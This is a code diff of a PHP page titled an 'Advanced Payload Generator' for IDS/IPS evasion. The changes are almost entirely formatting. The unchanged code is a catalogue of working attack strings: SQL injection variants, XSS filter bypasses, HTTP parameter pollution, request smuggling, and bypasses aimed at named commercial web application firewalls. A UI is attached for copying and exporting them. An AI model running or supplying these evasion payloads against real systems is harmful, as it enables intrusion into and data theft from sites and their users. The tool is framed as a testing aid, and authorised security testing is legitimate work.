@@ -1,13 +1,16 @@
 <?php
+
 /**
  * Payload Generator for Advanced IDS/IPS Evasion
  * Generates sophisticated payloads to bypass detection systems
  */
 
-class PayloadGenerator {
-    
+class PayloadGenerator
+{
+
     // Generate SQL injection payloads with advanced evasion
-    public static function generateSQLPayloads() {
+    public static function generateSQLPayloads()
+    {
         return [
             'basic_union' => [
                 'description' => 'Basic UNION injection',
@@ -19,7 +22,7 @@ class PayloadGenerator {
                     'alternative_space' => "'\t" . "UNION\t" . "SELECT\t" . "null,null,null,null,null,null--"
                 ]
             ],
-            
+
             'boolean_blind' => [
                 'description' => 'Boolean-based blind injection',
                 'original' => "' AND 1=1--",
@@ -31,7 +34,7 @@ class PayloadGenerator {
                     'encoded_and' => "' " . chr(65) . chr(78) . chr(68) . " 1=1--"
                 ]
             ],
-            
+
             'time_based' => [
                 'description' => 'Time-based blind injection',
                 'original' => "' AND (SELECT SLEEP(5))--",
@@ -43,7 +46,7 @@ class PayloadGenerator {
                     'waitfor_delay' => "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                 ]
             ],
-            
+
             'error_based' => [
                 'description' => 'Error-based injection',
                 'original' => "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
@@ -54,7 +57,7 @@ class PayloadGenerator {
                     'exp_overflow' => "' AND EXP(~(SELECT * FROM (SELECT user())a))--"
                 ]
             ],
-            
+
             'information_gathering' => [
                 'description' => 'Information schema access',
                 'original' => "' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables--",
@@ -66,9 +69,10 @@ class PayloadGenerator {
             ]
         ];
     }
-    
+
     // Generate XSS payloads with evasion
-    public static function generateXSSPayloads() {
+    public static function generateXSSPayloads()
+    {
         return [
             'basic_script' => [
                 'description' => 'Basic script injection',
@@ -81,7 +85,7 @@ class PayloadGenerator {
                     'nested_encoding' => '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>'
                 ]
             ],
-            
+
             'event_handlers' => [
                 'description' => 'Event handler injection',
                 'original' => '<img src=x onerror="alert(1)">',
@@ -94,7 +98,7 @@ class PayloadGenerator {
                     'iframe_src' => '<iframe src="javascript:alert(1)"></iframe>'
                 ]
             ],
-            
+
             'filter_bypass' => [
                 'description' => 'Filter bypass techniques',
                 'original' => '<script>alert(1)</script>',
@@ -107,7 +111,7 @@ class PayloadGenerator {
                     'double_encoding' => '%253Cscript%253Ealert(1)%253C/script%253E'
                 ]
             ],
-            
+
             'context_specific' => [
                 'description' => 'Context-specific XSS',
                 'original' => 'javascript:alert(1)',
@@ -120,7 +124,7 @@ class PayloadGenerator {
                     'livescript' => 'livescript:alert(1)'
                 ]
             ],
-            
+
             'polyglot' => [
                 'description' => 'Polyglot XSS payloads',
                 'original' => 'Universal polyglot',
@@ -132,9 +136,10 @@ class PayloadGenerator {
             ]
         ];
     }
-    
+
     // Generate HTTP parameter pollution payloads
-    public static function generateHPPPayloads() {
+    public static function generateHPPPayloads()
+    {
         return [
             'parameter_pollution' => [
                 'description' => 'HTTP Parameter Pollution',
@@ -148,29 +153,31 @@ class PayloadGenerator {
             ]
         ];
     }
-    
+
     // Generate advanced evasion combinations
-    public static function generateAdvancedCombinations() {
+    public static function generateAdvancedCombinations()
+    {
         return [
             'sql_xss_combo' => [
                 'description' => 'Combined SQL injection and XSS',
                 'payload' => '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>'
             ],
-            
+
             'steganographic' => [
                 'description' => 'Steganographically hidden payload',
                 'payload' => '/* Hidden: ' . base64_encode('<script>alert(1)</script>') . ' */'
             ],
-            
+
             'protocol_smuggling' => [
                 'description' => 'HTTP protocol smuggling',
                 'payload' => "GET /search?q=' OR 1=1-- HTTP/1.1\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
             ]
         ];
     }
-    
+
     // Generate timing-based evasion alternatives
-    public static function generateTimingAlternatives() {
+    public static function generateTimingAlternatives()
+    {
         return [
             'mysql_alternatives' => [
                 'sleep_bypass' => [
@@ -180,21 +187,22 @@ class PayloadGenerator {
                     'name_const' => 'NAME_CONST(SLEEP(5),1)'
                 ]
             ],
-            
+
             'postgresql_alternatives' => [
                 'pg_sleep' => 'pg_sleep(5)',
                 'generate_series' => '(SELECT count(*) FROM generate_series(1,5000000))'
             ],
-            
+
             'mssql_alternatives' => [
                 'waitfor' => 'WAITFOR DELAY \'0:0:5\'',
                 'heavy_computation' => '(SELECT count(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3)'
             ]
         ];
     }
-    
+
     // Generate WAF-specific bypass techniques
-    public static function generateWAFBypasses($waf_type = 'generic') {
+    public static function generateWAFBypasses($waf_type = 'generic')
+    {
         $bypasses = [
             'generic' => [
                 'comment_injection' => [
@@ -212,61 +220,63 @@ class PayloadGenerator {
                     'form_feeds' => "UNION\fSELECT"
                 ]
             ],
-            
+
             'cloudflare' => [
                 'double_encoding' => '%2527%2520UNION%2520SELECT',
                 'unicode_bypass' => 'UNI%C0%AFON SELECT',
                 'http_pollution' => ['q' => 'UNI', 'q' => 'ON SEL', 'q' => 'ECT']
             ],
-            
+
             'akamai' => [
                 'chunked_encoding' => "5\r\nUNION\r\n6\r\nSELECT\r\n0\r\n\r\n",
                 'gzip_compression' => gzdeflate('UNION SELECT'),
                 'content_type_confusion' => 'application/x-www-form-urlencoded; boundary=--'
             ],
-            
+
             'aws_waf' => [
                 'json_injection' => '{"query": "UNI\\u004fN SELECT"}',
                 'base64_fragmentation' => base64_encode('UNI') . base64_encode('ON SELECT'),
                 'xml_cdata' => '<![CDATA[UNION SELECT]]>'
             ]
         ];
-        
+
         return $bypasses[$waf_type] ?? $bypasses['generic'];
     }
-    
+
     // Generate context-aware payloads
-    public static function generateContextAwarePayloads($context) {
+    public static function generateContextAwarePayloads($context)
+    {
         $contexts = [
             'html_attribute' => [
                 'onclick' => '" onclick="alert(1)"',
                 'onmouseover' => '" onmouseover="alert(1)"',
                 'style' => '" style="background:url(javascript:alert(1))"'
             ],
-            
+
             'javascript_string' => [
                 'escape_quotes' => '\';alert(1)//\'',
                 'string_concat' => '\'+alert(1)+\'',
                 'template_literal' => '`${alert(1)}`'
             ],
-            
+
             'css_context' => [
                 'expression' => 'expression(alert(1))',
                 'url_javascript' => 'url(javascript:alert(1))',
                 'import' => '@import javascript:alert(1)'
             ],
-            
+
             'json_context' => [
                 'json_injection' => '","xss":"<script>alert(1)</script>"',
                 'unicode_escape' => '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'
             ]
         ];
-        
+
         return $contexts[$context] ?? [];
     }
-    
+
     // Generate all payloads for comprehensive testing
-    public static function generateAllPayloads() {
+    public static function generateAllPayloads()
+    {
         return [
             'sql_injection' => self::generateSQLPayloads(),
             'xss' => self::generateXSSPayloads(),
@@ -294,7 +304,7 @@ if ($_GET['export'] ?? false) {
 if ($_POST['test_payload'] ?? false) {
     $payload = $_POST['payload'] ?? '';
     $context = $_POST['context'] ?? 'search';
-    
+
     // Test the payload
     try {
         switch ($context) {
@@ -320,6 +330,7 @@ if ($_POST['test_payload'] ?? false) {
 
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -327,12 +338,28 @@ if ($_POST['test_payload'] ?? false) {
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-dark.min.css" rel="stylesheet">
     <style>
-        .payload-card { border-left: 4px solid #007bff; }
-        .payload-evaded { background-color: #f8f9fa; padding: 10px; border-radius: 5px; margin: 5px 0; }
-        .copy-btn { font-size: 0.8em; }
-        .technique-badge { font-size: 0.7em; margin: 2px; }
+        .payload-card {
+            border-left: 4px solid #007bff;
+        }
+
+        .payload-evaded {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 5px 0;
+        }
+
+        .copy-btn {
+            font-size: 0.8em;
+        }
+
+        .technique-badge {
+            font-size: 0.7em;
+            margin: 2px;
+        }
     </style>
 </head>
+
 <body>
     <div class="container-fluid mt-4">
         <div class="card">
@@ -340,7 +367,7 @@ if ($_POST['test_payload'] ?? false) {
                 <h2><i class="fas fa-code"></i> 🛠️ Advanced Payload Generator</h2>
                 <p class="mb-0">Generate sophisticated payloads for IDS/IPS evasion testing</p>
             </div>
-            
+
             <div class="card-body">
                 <div class="row">
                     <div class="col-md-3">
@@ -364,41 +391,41 @@ if ($_POST['test_payload'] ?? false) {
                                 <i class="fas fa-rocket"></i> Advanced Combos
                             </a>
                         </div>
-                        
+
                         <div class="mt-3">
                             <button class="btn btn-primary btn-sm w-100" onclick="exportPayloads()">
                                 <i class="fas fa-download"></i> Export All
                             </button>
                         </div>
                     </div>
-                    
+
                     <div class="col-md-9">
                         <div class="tab-content">
                             <div class="tab-pane fade show active" id="sql">
                                 <h5>SQL Injection Payloads</h5>
                                 <div id="sql-payloads"></div>
                             </div>
-                            
+
                             <div class="tab-pane fade" id="xss">
                                 <h5>XSS Evasion Payloads</h5>
                                 <div id="xss-payloads"></div>
                             </div>
-                            
+
                             <div class="tab-pane fade" id="hpp">
                                 <h5>HTTP Parameter Pollution</h5>
                                 <div id="hpp-payloads"></div>
                             </div>
-                            
+
                             <div class="tab-pane fade" id="waf">
                                 <h5>WAF Bypass Techniques</h5>
                                 <div id="waf-payloads"></div>
                             </div>
-                            
+
                             <div class="tab-pane fade" id="timing">
                                 <h5>Timing Attack Alternatives</h5>
                                 <div id="timing-payloads"></div>
                             </div>
-                            
+
                             <div class="tab-pane fade" id="advanced">
                                 <h5>Advanced Combination Payloads</h5>
                                 <div id="advanced-payloads"></div>
@@ -428,7 +455,7 @@ if ($_POST['test_payload'] ?? false) {
         function displaySQLPayloads(payloads) {
             const container = document.getElementById('sql-payloads');
             let html = '';
-            
+
             for (const [key, payload] of Object.entries(payloads)) {
                 html += `
                     <div class="card payload-card mb-3">
@@ -455,14 +482,14 @@ if ($_POST['test_payload'] ?? false) {
                     </div>
                 `;
             }
-            
+
             container.innerHTML = html;
         }
-        
+
         function displayXSSPayloads(payloads) {
             const container = document.getElementById('xss-payloads');
             let html = '';
-            
+
             for (const [key, payload] of Object.entries(payloads)) {
                 html += `
                     <div class="card payload-card mb-3">
@@ -489,32 +516,33 @@ if ($_POST['test_payload'] ?? false) {
                     </div>
                 `;
             }
-            
+
             container.innerHTML = html;
         }
-        
+
         // Similar functions for other payload types...
-        
+
         function escapeHtml(text) {
             const div = document.createElement('div');
             div.textContent = text;
             return div.innerHTML;
         }
-        
+
         function escapeForJs(text) {
             return text.replace(/'/g, "\\'").replace(/"/g, '\\"');
         }
-        
+
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 // Show success feedback
                 console.log('Copied to clipboard');
             });
         }
-        
+
         function exportPayloads() {
             window.open('?export=1', '_blank');
         }
     </script>
 </body>
+
 </html>
